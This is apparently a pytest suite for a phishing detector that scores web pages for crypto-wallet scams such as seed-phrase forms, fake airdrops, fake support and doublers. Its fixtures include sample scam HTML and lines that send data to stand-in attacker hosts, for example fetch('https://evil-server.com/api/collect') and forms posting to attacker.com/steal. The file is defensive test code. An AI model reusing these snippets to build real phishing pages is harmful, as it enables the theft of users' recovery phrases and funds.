"""Tests for phishing detection."""

import pytest
from pathlib import Path
from src.analyzer.detector import PhishingDetector
from src.analyzer.browser import BrowserResult, ExplorationStep
from src.config import load_config


@pytest.fixture
def detector(tmp_path):
    """Create a phishing detector for testing."""
    config = load_config()
    return PhishingDetector(
        fingerprints_dir=tmp_path / "fingerprints",
        config_dir=Path("config"),
        keywords=["recovery phrase", "seed phrase"],
        analysis_threshold=70,
        pattern_categories=config.pattern_categories,
        scoring_weights=config.scoring_weights,
    )


def make_browser_result(
    domain: str = "test.com",
    success: bool = True,
    html: str = "",
    input_fields: list = None,
    form_submissions: list = None,
    external_requests: list = None,
    title: str = "",
) -> BrowserResult:
    """Create a BrowserResult for testing."""
    return BrowserResult(
        domain=domain,
        success=success,
        html=html,
        input_fields=input_fields or [],
        form_submissions=form_submissions or [],
        external_requests=external_requests or [],
        title=title,
    )


class TestPhishingDetector:
    """Test phishing detection logic."""

    def test_failed_analysis(self, detector):
        """Failed analysis should return low verdict."""
        result = make_browser_result(success=False)
        detection = detector.detect(result)
        assert detection.verdict == "low"

    def test_seed_form_12_inputs(self, detector):
        """12 text inputs should trigger seed form detection."""
        inputs = [{"type": "text", "name": f"word{i}", "placeholder": "", "id": ""} for i in range(12)]
        result = make_browser_result(input_fields=inputs)
        detection = detector.detect(result)
        assert detection.seed_form_detected
        assert detection.score >= 30

    def test_seed_form_24_inputs(self, detector):
        """24 text inputs should trigger seed form detection."""
        inputs = [{"type": "text", "name": f"word{i}", "placeholder": "", "id": ""} for i in range(24)]
        result = make_browser_result(input_fields=inputs)
        detection = detector.detect(result)
        assert detection.seed_form_detected
        assert detection.score >= 30

    def test_seed_form_from_exploration_without_explored_flag(self, detector):
        """Exploration steps should be analyzed even if 'explored' wasn't set."""
        step_inputs = [{"type": "text", "name": f"word{i}", "placeholder": "", "id": ""} for i in range(12)]
        step = ExplorationStep(button_text="Continue on Legacy Wallet", success=True, input_fields=step_inputs)
        result = make_browser_result()
        result.explored = False
        result.exploration_steps = [step]

        detection = detector.detect(result)
        assert detection.seed_form_detected
        assert any("via exploration" in r.lower() for r in detection.reasons)
        assert any(r.startswith("EXPLORE:") for r in detection.reasons)

    def test_seed_keywords_in_html(self, detector):
        """Seed-related keywords should be detected."""
        html = """
        <html>
            <body>
                <h1>Enter your recovery phrase</h1>
                <p>Please enter your 12 seed words below</p>
            </body>
        </html>
        """
        result = make_browser_result(html=html)
        detection = detector.detect(result)
        assert detection.score >= 10
        assert any("keyword" in r.lower() or "seed" in r.lower() for r in detection.reasons)

    def test_external_form_submission(self, detector):
        """Form submission to external domain should be flagged."""
        result = make_browser_result(
            domain="kaspa-wallet.xyz",
            form_submissions=[{"url": "https://evil-server.com/collect", "method": "POST", "post_data": None}],
        )
        detection = detector.detect(result)
        assert detection.score >= 30
        assert len(detection.suspicious_endpoints) > 0

    def test_internal_form_submission_pattern_is_detected(self, detector):
        """Malicious submission paths should be detected even on the same host."""
        result = make_browser_result(
            domain="phish.example/wallet",
            form_submissions=[{"url": "https://phish.example/api/form/submit", "method": "POST", "post_data": None}],
        )
        detection = detector.detect(result)
        assert any("malicious url pattern" in r.lower() for r in detection.reasons)
        assert not any("form submits to external" in r.lower() for r in detection.reasons)
        assert any("/api/form/submit" in ep for ep in detection.suspicious_endpoints)

    def test_code_endpoints_added_to_suspicious_endpoints(self, detector):
        """C2 endpoints found in code should be merged into suspicious endpoints."""
        html = "<script>fetch('https://evil-server.com/api/collect')</script>"
        result = make_browser_result(domain="kaspa-wallet.xyz", html=html)
        detection = detector.detect(result)
        assert any("evil-server.com" in ep for ep in detection.suspicious_endpoints)

    def test_suspicious_title(self, detector):
        """Suspicious page titles should add to score."""
        result = make_browser_result(title="Kaspa Wallet Recovery")
        detection = detector.detect(result)
        assert detection.score >= 15

    def test_benign_page(self, detector):
        """Benign pages should have low scores."""
        result = make_browser_result(
            html="<html><body><h1>Hello World</h1></body></html>",
            title="My Website",
        )
        detection = detector.detect(result)
        assert detection.verdict in ("low", "benign")
        assert detection.score < 30

    def test_high_confidence_phishing(self, detector):
        """Multiple signals should result in high confidence."""
        inputs = [
            {"type": "text", "name": f"word{i}", "placeholder": f"Word #{i+1}", "id": f"seed{i}"}
            for i in range(24)
        ]
        html = """
        <html>
            <body>
                <h1>Restore Your Kaspa Wallet</h1>
                <p>Enter your 24 word recovery phrase to restore access</p>
                <form action="https://attacker.com/steal">
                </form>
            </body>
        </html>
        """
        result = make_browser_result(
            domain="kaspa-restore.xyz",
            html=html,
            input_fields=inputs,
            form_submissions=[{"url": "https://attacker.com/steal", "method": "POST", "post_data": None}],
            title="Kaspa Wallet Recovery",
        )
        detection = detector.detect(result, domain_score=50)
        assert detection.verdict == "high"
        assert detection.score >= 70


class TestVerdictClassification:
    """Test verdict classification thresholds."""

    def test_high_verdict(self, detector):
        """Score >= 70 should be high."""
        result = make_browser_result()
        result.input_fields = [{"type": "text", "name": f"word{i}", "placeholder": "", "id": ""} for i in range(24)]
        result.form_submissions = [{"url": "https://evil.com/steal", "method": "POST", "post_data": None}]
        result.html = "<html><body>Enter your seed phrase recovery words</body></html>"
        detection = detector.detect(result, domain_score=50)
        assert detection.verdict == "high"

    def test_medium_verdict(self, detector):
        """Score 40-69 should be medium."""
        result = make_browser_result(
            html="<html><body>Enter your seed phrase</body></html>",
            title="Wallet Recovery",
        )
        detection = detector.detect(result, domain_score=30)
        # This might be medium depending on exact scoring
        assert detection.verdict in ("medium", "low")

    def test_low_verdict(self, detector):
        """Score 20-39 should be low."""
        result = make_browser_result(title="Kaspa Info")
        detection = detector.detect(result)
        assert detection.verdict in ("low", "benign")

    def test_benign_verdict(self, detector):
        """Score < 20 should be benign."""
        result = make_browser_result()
        detection = detector.detect(result)
        assert detection.verdict == "benign"


class TestPatternCategories:
    """Test detection of various scam type pattern categories."""

    def test_fake_airdrop_detection(self, detector):
        """Fake airdrop patterns should be detected."""
        html = """
        <html><body>
            <h1>KASPA AIRDROP EVENT</h1>
            <p>Connect your wallet to claim free KAS tokens!</p>
            <p>Limited time offer - claim your free airdrop now</p>
            <button>Connect Wallet</button>
        </body></html>
        """
        result = make_browser_result(
            domain="kaspa-airdrop.xyz",
            html=html,
            title="Kaspa Free Airdrop",
        )
        detection = detector.detect(result, domain_score=40)
        assert detection.score >= 30
        assert any("AIRDROP" in r for r in detection.reasons)

    def test_malware_download_detection(self, detector):
        """Malware download patterns should be detected."""
        html = """
        <html><body>
            <h1>Download KasWare Wallet</h1>
            <p>Download the official Kaspa wallet for Windows</p>
            <a href="kasware-setup.exe">Download Now</a>
        </body></html>
        """
        result = make_browser_result(
            domain="kasware-download.xyz",
            html=html,
            title="KasWare Download",
        )
        detection = detector.detect(result, domain_score=40)
        assert detection.score >= 20
        assert any("MALWARE" in r for r in detection.reasons)

    def test_fake_support_detection(self, detector):
        """Fake support patterns should be detected."""
        html = """
        <html><body>
            <h1>Kaspa Support Team</h1>
            <p>Contact our support team for wallet assistance</p>
            <p>Chat with our live support now</p>
            <button>Start Live Chat</button>
        </body></html>
        """
        result = make_browser_result(
            domain="kaspa-support.xyz",
            html=html,
            title="Kaspa Help Desk",
        )
        detection = detector.detect(result, domain_score=40)
        assert detection.score >= 20
        assert any("SUPPORT" in r for r in detection.reasons)

    def test_crypto_doubler_detection(self, detector):
        """Crypto doubler patterns should be detected."""
        html = """
        <html><body>
            <h1>Double Your KAS</h1>
            <p>Send 1000 KAS and receive 2000 KAS back!</p>
            <p>Guaranteed returns within 10 minutes</p>
            <p>Send to: kaspa:qz2vq0y3n8k4z9a7b1c6d5e8f2g4h3j6k9l1m4n7p0r5s8t2u6v9w3x0y7z4</p>
        </body></html>
        """
        result = make_browser_result(
            domain="kaspa-double.xyz",
            html=html,
            title="Double Your Kaspa",
        )
        detection = detector.detect(result, domain_score=50)
        assert detection.score >= 30
        assert any("DOUBLER" in r for r in detection.reasons)

    def test_seed_phishing_detection(self, detector):
        """Seed phishing patterns should be detected."""
        html = """
        <html><body>
            <h1>Restore Wallet</h1>
            <p>Enter your 12 or 24 word recovery phrase</p>
            <p>Your private keys are encrypted and secure</p>
        </body></html>
        """
        result = make_browser_result(
            domain="kaspa-restore.xyz",
            html=html,
            title="Wallet Recovery",
        )
        detection = detector.detect(result, domain_score=40)
        assert detection.score >= 20
        assert any("SEED" in r for r in detection.reasons)

    def test_multiple_category_detection(self, detector):
        """Multiple scam types on same page should all be detected."""
        html = """
        <html><body>
            <h1>Claim Your Free Kaspa Airdrop!</h1>
            <p>Enter your recovery phrase to verify wallet ownership</p>
            <p>Contact our support team if you need help</p>
        </body></html>
        """
        result = make_browser_result(
            domain="kaspa-scam.xyz",
            html=html,
            title="Kaspa Giveaway",
        )
        detection = detector.detect(result, domain_score=50)
        # Should detect multiple categories
        reason_labels = [r.split(":")[0] for r in detection.reasons if ":" in r]
        assert len(set(reason_labels)) >= 1  # At least one category detected
        assert detection.score >= 30
